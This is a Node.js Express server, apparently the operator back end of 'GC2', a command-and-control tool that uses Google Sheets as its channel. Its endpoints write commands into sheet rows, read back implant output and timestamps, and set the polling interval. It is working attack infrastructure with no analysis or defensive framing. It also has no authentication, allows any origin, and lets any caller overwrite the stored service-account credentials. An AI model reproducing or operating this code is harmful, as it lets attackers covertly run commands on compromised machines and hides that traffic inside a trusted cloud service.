const express  = require('express');
const cors     = require('cors');
const { google } = require('googleapis');
const fs       = require('fs');
const path     = require('path');
const yaml     = require('js-yaml');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

const OPTIONS_PATH = process.env.GC2_OPTIONS_PATH
  || path.resolve(__dirname, '../c2/cmd/options.yml');

function loadOptions() {
  try {
    const raw = fs.readFileSync(OPTIONS_PATH, 'utf8');
    const doc = yaml.load(raw);
    return {
      serviceAccountKey: doc.GoogleServiceAccountKey || '',
      sheetId:           doc.GoogleSheetID            || '',
      rowId:             doc.RowId || 1,
      proxy:             doc.Proxy  || null,
      verbose:           doc.Verbose || false,
    };
  } catch (e) {
    console.error('[GC2] Failed to read options.yml:', e.message);
    return {};
  }
}

function getAuthClient(keyOverride) {
  const opts = loadOptions();
  const raw  = keyOverride || opts.serviceAccountKey;
  if (!raw) throw new Error('No GoogleServiceAccountKey found in options.yml');
  const credentials = typeof raw === 'string' ? JSON.parse(raw) : raw;
  return new google.auth.GoogleAuth({
    credentials,
    scopes: ['https://www.googleapis.com/auth/spreadsheets'],
  });
}

function resolveParams(source) {
  const opts = loadOptions();
  return {
    serviceAccountKey: source.serviceAccountKey || opts.serviceAccountKey,
    sheetId:           source.sheetId           || opts.sheetId,
    sheetName:         source.sheetName,
  };
}

app.get('/api/config', (req, res) => {
  try {
    const opts = loadOptions();
    res.json({
      sheetId:           opts.sheetId,
      rowId:             opts.rowId,
      verbose:           opts.verbose,
      hasServiceAccount: !!opts.serviceAccountKey,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/config', (req, res) => {
  try {
    const raw = fs.readFileSync(OPTIONS_PATH, 'utf8');
    const doc = yaml.load(raw) || {};
    const b   = req.body;

    if (b.sheetId)           doc.GoogleSheetID           = b.sheetId;
    if (b.serviceAccountKey) doc.GoogleServiceAccountKey = b.serviceAccountKey;

    fs.writeFileSync(OPTIONS_PATH, yaml.dump(doc), 'utf8');
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/sheets/tabs', async (req, res) => {
  try {
    const p      = resolveParams(req.query);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const resp   = await sheets.spreadsheets.get({ spreadsheetId: p.sheetId });
    const tabs   = resp.data.sheets.map(s => ({
      id:    s.properties.sheetId,
      title: s.properties.title,
      index: s.properties.index,
    }));
    res.json({ tabs });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/sheets/rows', async (req, res) => {
  try {
    const p      = resolveParams(req.query);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const range  = `${p.sheetName}!A1:E200`;
    const resp   = await sheets.spreadsheets.values.get({
      spreadsheetId: p.sheetId,
      range,
    });
    const rows = (resp.data.values || []).map((row, i) => ({
      rowIndex:   i + 1,
      command:    row[0] || '',
      output:     row[1] || '',
      timestamp:  row[2] || '',
      delayLabel: row[3] || '',
      delayValue: row[4] || '',
    }));
    res.json({ rows });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/sheets/command', async (req, res) => {
  try {
    const p      = resolveParams(req.body);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const range  = `${req.body.sheetName}!A${req.body.rowIndex}`;
    await sheets.spreadsheets.values.update({
      spreadsheetId: p.sheetId,
      range,
      valueInputOption: 'RAW',
      requestBody: { values: [[req.body.command]] },
    });
    res.json({ success: true });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/sheets/ticker', async (req, res) => {
  try {
    const p      = resolveParams(req.query);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    const resp   = await sheets.spreadsheets.values.get({
      spreadsheetId: p.sheetId,
      range: `${req.query.sheetName}!E2`,
    });
    res.json({ ticker: parseInt(resp.data.values?.[0]?.[0] || '60', 10) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/sheets/ticker', async (req, res) => {
  try {
    const p      = resolveParams(req.body);
    const auth   = getAuthClient(p.serviceAccountKey);
    const sheets = google.sheets({ version: 'v4', auth });
    await sheets.spreadsheets.values.update({
      spreadsheetId: p.sheetId,
      range: `${req.body.sheetName}!E2`,
      valueInputOption: 'RAW',
      requestBody: { values: [[String(req.body.ticker)]] },
    });
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  const opts = loadOptions();
  console.log(`GC2 API Server → http://localhost:${PORT}`);
  console.log(`  Config file  → ${OPTIONS_PATH}`);
  console.log(`  Sheet ID     → ${opts.sheetId || '(not set)'}`);
  console.log(`  Service Acct → ${opts.serviceAccountKey ? '✓ loaded' : '✗ MISSING'}`);
});
